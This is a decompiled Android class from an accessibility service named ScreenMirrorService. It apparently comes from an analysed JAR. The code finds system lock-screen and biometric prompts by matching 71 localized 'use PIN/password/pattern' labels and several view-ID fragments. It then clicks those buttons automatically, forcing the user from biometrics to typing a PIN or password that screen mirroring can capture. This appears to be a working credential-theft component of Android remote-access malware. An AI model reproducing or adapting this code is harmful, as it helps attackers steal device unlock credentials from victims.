// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package w1;

import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import lyr.stable.runtime.ScreenMirrorService;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final class m6 {

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public static final String[] f4528e = {"使用图案", "使用密码", "使用PIN", "使用 PIN", "使用屏幕锁定", "PIN 或密码", "PIN或密码", "用密码", "用图案", "输入密码", "输入PIN", "其他方式", "其它方式", "使用圖案", "使用密碼", "使用螢幕鎖定", "其他方式", "Use pattern", "Use password", "Use PIN", "Use screen lock", "PIN or password", "PIN 또는 비밀번호", "암호 사용", "Enter password", "Enter PIN", "Unlock with PIN", "Unlock with password", "Try another way", "Use lock screen", "Usar patrón", "Usar contraseña", "Usar PIN", "Usar padrão", "Usar senha", "Utiliser le schéma", "Utiliser le mot de passe", "Utiliser le code PIN", "Muster verwenden", "Passwort verwenden", "PIN verwenden", "Графический ключ", "Использовать пароль", "Использовать PIN", "패턴 사용", "비밀번호 사용", "PIN 사용", "パターンを使用", "パスワードを使用", "PINを使用", "استخدام النمط", "استخدام كلمة المرور", "Gunakan pola", "Gunakan sandi", "Gunakan PIN", "ใช้รูปแบบ", "ใช้รหัสผ่าน", "Dùng hình mở khóa", "Dùng mật khẩu", "Dùng PIN", "Deseni kullan", "Şifreyi kullan", "पैटर्न का उपयोग करें", "पासवर्ड का उपयोग करें", "Usa sequenza", "Usa password", "Usa PIN", "Użyj wzoru", "Użyj hasła", "Patroon gebruiken", "Wachtwoord gebruiken"};

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public static final String[] f4529f = {"use_credential", "use_pattern", "use_password", "use_pin", "alternate", "credential", "lockpattern", "lockpassword", "btn_credential", "btn_use_other", "fingerprint_use_other", "btn_password", "use_other", "footerleftbutton", "footer_left", "button_negative", "button2", "negative"};

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public final ScreenMirrorService f4530a;

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public final q5 f4531b;

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public long f4532c;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public long f4533d;

    public m6(ScreenMirrorService screenMirrorService, q5 q5Var) {
        this.f4530a = screenMirrorService;
        this.f4531b = q5Var;
    }

    public static boolean a(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo != null) {
            String viewIdResourceName = accessibilityNodeInfo.getViewIdResourceName();
            if (viewIdResourceName != null) {
                String lowerCase = viewIdResourceName.toLowerCase(Locale.ROOT);
                for (int i3 = 0; i3 < 18; i3++) {
                    String str = f4529f[i3];
                    if (lowerCase.contains(str) && accessibilityNodeInfo.isClickable()) {
                        try {
                            if (accessibilityNodeInfo.isEditable()) {
                                continue;
                            } else {
                                String lowerCase2 = null;
                                try {
                                    CharSequence className = accessibilityNodeInfo.getClassName();
                                    if (className != null) {
                                        lowerCase2 = className.toString().toLowerCase(Locale.ROOT);
                                    }
                                } catch (Throwable unused) {
                                }
                                if ((lowerCase2 == null || !lowerCase2.contains("edittext")) && c(accessibilityNodeInfo)) {
                                    Log.i("NativeConfirmFallback", "layer2 hit vid=" + viewIdResourceName + " frag=" + str);
                                    return true;
                                }
                            }
                        } catch (Throwable unused2) {
                        }
                    }
                }
            }
            for (int i4 = 0; i4 < accessibilityNodeInfo.getChildCount(); i4++) {
                if (a(accessibilityNodeInfo.getChild(i4))) {
                    return true;
                }
            }
        }
        return false;
    }

    public static boolean b(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        CharSequence packageName = accessibilityNodeInfo.getPackageName();
        if (packageName != null && (string = packageName.toString()) != null) {
            String lowerCase = string.toLowerCase(Locale.ROOT);
            if (!lowerCase.contains("launcher") && (lowerCase.contains("systemui") || lowerCase.contains("biometric") || lowerCase.contains("keyguard") || lowerCase.contains("com.android.settings") || lowerCase.contains("samsung.android.biometrics"))) {
                for (int i3 = 0; i3 < 71; i3++) {
                    String str = f4528e[i3];
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str);
                    if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                        try {
                            for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByText) {
                                if (accessibilityNodeInfo2 != null && c(accessibilityNodeInfo2)) {
                                    Log.i("NativeConfirmFallback", "layer1 hit text=" + str);
                                    for (AccessibilityNodeInfo accessibilityNodeInfo3 : listFindAccessibilityNodeInfosByText) {
                                        if (accessibilityNodeInfo3 != null) {
                                            accessibilityNodeInfo3.recycle();
                                        }
                                    }
                                    return true;
                                }
                            }
                            for (AccessibilityNodeInfo accessibilityNodeInfo4 : listFindAccessibilityNodeInfosByText) {
                                if (accessibilityNodeInfo4 != null) {
                                    accessibilityNodeInfo4.recycle();
                                }
                            }
                        } catch (Throwable th) {
                            for (AccessibilityNodeInfo accessibilityNodeInfo5 : listFindAccessibilityNodeInfosByText) {
                                if (accessibilityNodeInfo5 != null) {
                                    accessibilityNodeInfo5.recycle();
                                }
                            }
                            throw th;
                        }
                    }
                }
                if (a(accessibilityNodeInfo)) {
                    return true;
                }
            }
        }
        return false;
    }

    public static boolean c(AccessibilityNodeInfo accessibilityNodeInfo) {
        boolean z2;
        int i3 = 0;
        if (accessibilityNodeInfo == null) {
            return false;
        }
        ArrayList arrayList = new ArrayList();
        int i4 = 0;
        while (true) {
            if (i4 >= 5 || accessibilityNodeInfo == null) {
                z2 = false;
                break;
            }
            if (accessibilityNodeInfo.performAction(16)) {
                Log.i("NativeConfirmFallback", "m2 click ok depth=" + i4);
                z2 = true;
                break;
            }
            accessibilityNodeInfo = accessibilityNodeInfo.getParent();
            if (accessibilityNodeInfo != null) {
                arrayList.add(accessibilityNodeInfo);
            }
            i4++;
        }
        int size = arrayList.size();
        while (i3 < size) {
            Object obj = arrayList.get(i3);
            i3++;
            try {
                ((AccessibilityNodeInfo) obj).recycle();
            } catch (Throwable unused) {
            }
        }
        return z2;
    }
}
